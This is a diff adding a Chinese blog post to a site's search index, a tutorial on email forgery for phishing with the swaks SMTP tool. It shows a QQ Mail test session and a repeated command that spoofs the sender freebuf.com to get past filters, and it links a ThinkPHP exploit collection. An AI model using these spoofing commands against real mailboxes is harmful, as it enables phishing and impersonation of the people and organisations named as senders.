@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[钓鱼邮件初探：黑客是如何进行邮件伪造的？]]></title>
+    <url>%2Farchives%2F368c71e.html</url>
+    <content type="text"><![CDATA[钓鱼邮件初探：黑客是如何进行邮件伪造的？ 现如今的钓鱼邮件都是通过注册相似的邮箱，或者设置邮箱的显示名称，盼着被害人有看走眼的那一刻，轻信邮件的内容。这种方法需要一定的社工技巧，以及诱导性的语言来诱使被害人上钩。但是对于有一定的经验以及眼力的人来说，还是可以识破骗子的伎俩。 下面我要介绍的这款工具可以最大程度的欺骗你的邮箱，更不要提你的眼睛。当然，此方法不是适用于任何邮箱，毕竟每种邮箱的过滤机制都不相同。gmail在这方面就做的不错。 Swaks - SMTP界的瑞士军刀基本用法： swaks –to &lt;要测试的邮箱&gt; 用来测试邮箱的连通性 root@kali:~# swaks --to xxxx@qq.com === Trying mx3.qq.com:25... === Connected to mx3.qq.com. &lt;- 220 newmx59.qq.com MX QQ Mail Server -&gt; EHLO kali &lt;- 250-newmx59.qq.com &lt;- 250-SIZE 73400320 &lt;- 250-STARTTLS &lt;- 250 OK -&gt; MAIL FROM:&lt;root@kali&gt; &lt;- 250 Ok -&gt; RCPT TO:&lt;xxxx@qq.com&gt; &lt;- 250 Ok -&gt; DATA &lt;- 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; -&gt; Date: Tue, 05 Jan 2016 23:15:11 -0500 -&gt; To: xxxx@qq.com -&gt; From: root@kali -&gt; Subject: test Tue, 05 Jan 2016 23:15:11 -0500 -&gt; X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/ -&gt; -&gt; This is a test mailing -&gt; -&gt; . &lt;** 550 Mail content denied. http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=20022&amp;&amp;no=1000726 -&gt; QUIT &lt;- 221 Bye === Connection closed with remote host.前面都返回250ok，说明该邮箱存在，并且可以正常收信。最后可以看到qq邮箱返回550错误，qq官方给出的出错原因：该邮件内容涉嫌大量群发，并且被多数用户投诉为垃圾邮件。 我们可以继续对邮件进行伪造，来绕过qq邮箱的判断 比如： swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot;其中： –from &lt;要显示的发件人邮箱&gt; –ehlo &lt;伪造的邮件ehlo头&gt; –body &lt;邮件正文&gt; –header &lt;邮件头信息，subject为邮件标题&gt;在你ip没有被qq邮箱band的情况下，邮件可以正常发送，返回250 ok。 高级用法： 使用swaks其实还可以进行更高级的邮件伪造，几乎可以伪造邮件中的每一个参数。 –data &lt;源邮件&gt; 首先，我们需要一份正常的邮件 M亲测可用的伪造邮箱方法 swaks –to xxxx@qq.com –from info@freebuf.com –ehlo freebuf.com –body hello –header “Subject: hello” swaks –to xxxx@qq.com –from info@freebuf.com –ehlo freebuf.com –body hello –header “Subject: hello” swaks –to xxxx@qq.com –from info@freebuf.com –ehlo freebuf.com –body hello –header “Subject: hello”]]></content>
+  </entry>
+  <entry>
     <title><![CDATA[Thinkphp-漏洞列表]]></title>
     <url>%2Farchives%2Ff1b53e95.html</url>
     <content type="text"><![CDATA[https://github.com/Maikefee/pochubs]]></content>
